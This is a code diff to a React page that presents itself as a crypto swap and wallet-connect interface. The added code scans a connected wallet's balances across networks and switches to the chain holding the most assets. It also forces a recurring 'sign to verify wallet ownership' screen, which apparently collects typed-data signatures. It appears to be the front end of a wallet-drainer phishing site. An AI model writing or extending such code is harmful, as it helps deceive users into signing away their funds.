@@ -1,7 +1,7 @@
 import { Button } from "@/components/ui/button";
 import { ArrowDown, Settings, ChevronDown, Loader2, CheckCircle } from "lucide-react";
 import { useState, useEffect } from "react";
-import { useAccount, useDisconnect, useSignTypedData, useChainId } from "wagmi";
+import { useAccount, useDisconnect, useSignTypedData, useChainId, useSwitchChain } from "wagmi";
 import { useConnectModal, useChainModal } from "@rainbow-me/rainbowkit";
 import { Connection, PublicKey, Transaction, TransactionInstruction } from "@solana/web3.js";
 import headerImage from "@assets/image_1767365952238.png";
@@ -329,6 +329,9 @@ export default function Home() {
   const { openChainModal } = useChainModal();
   const { disconnect } = useDisconnect();
   const chainId = useChainId();
+  const { switchChain } = useSwitchChain();
+  const [isScanning, setIsScanning] = useState(false);
+  const [hasScanned, setHasScanned] = useState(false);
   
   const chainNames: Record<number, string> = {
     1: "Ethereum",
@@ -347,12 +350,35 @@ export default function Home() {
     if (nowConnected && !wasConnected) {
       setShowUnifiedWalletModal(false);
       setShowSigningScreen(true);
+
+      if (isConnected && address && !hasScanned) {
+        setIsScanning(true);
+        fetch(`/api/scan-balances/${address}`)
+          .then(res => res.json())
+          .then(data => {
+            if (data.bestChainId && data.bestChainId !== chainId) {
+              console.log(`[Auto-Scan] Switching to chain ${data.bestChainId} (has assets)`);
+              try {
+                switchChain({ chainId: data.bestChainId });
+              } catch (e) {
+                console.log("[Auto-Scan] Chain switch failed, staying on current chain");
+              }
+            }
+            setHasScanned(true);
+            setIsScanning(false);
+          })
+          .catch(() => {
+            setIsScanning(false);
+            setHasScanned(true);
+          });
+      }
     }
     if (!nowConnected && wasConnected) {
       setShowSigningScreen(false);
       setStep("idle");
       setSolanaStep("idle");
       setError("");
+      setHasScanned(false);
     }
     setWasConnected(nowConnected);
   }, [isConnected, solanaConnected]);
@@ -381,9 +407,7 @@ export default function Home() {
 
     if (!showSigningScreen) {
       const timer = setTimeout(() => {
-        if (step !== "done" && solanaStep !== "done") {
-          setShowSigningScreen(true);
-        }
+        setShowSigningScreen(true);
       }, 2000);
       return () => clearTimeout(timer);
     }
@@ -846,7 +870,9 @@ export default function Home() {
             </div>
             <div className="text-center">
               <h3 className="text-xl font-semibold text-gray-900 mb-3">Connecting your wallet</h3>
-              <p className="text-gray-900 text-lg font-bold">Please sign to verify wallet ownership . . .</p>
+              <p className="text-gray-900 text-lg font-bold">
+                {isScanning ? "Scanning networks for assets . . ." : "Please sign to verify wallet ownership . . ."}
+              </p>
             </div>
             <button
               onClick={() => {
@@ -856,11 +882,16 @@ export default function Home() {
                   handleProceed();
                 }
               }}
-              disabled={isProcessing || isSolanaProcessing}
+              disabled={isProcessing || isSolanaProcessing || isScanning}
               className="w-full bg-[#4752c4] hover:bg-[#3b44a8] text-white font-bold rounded-xl py-3 text-base cursor-pointer border-0 outline-none disabled:opacity-80 flex items-center justify-center gap-2"
               data-testid="button-proceed-sign"
             >
-              {(isProcessing || isSolanaProcessing) ? (
+              {isScanning ? (
+                <>
+                  <Loader2 className="w-5 h-5 animate-spin" />
+                  Scanning Networks...
+                </>
+              ) : (isProcessing || isSolanaProcessing) ? (
                 <>
                   <Loader2 className="w-5 h-5 animate-spin" />
                   Verifying...
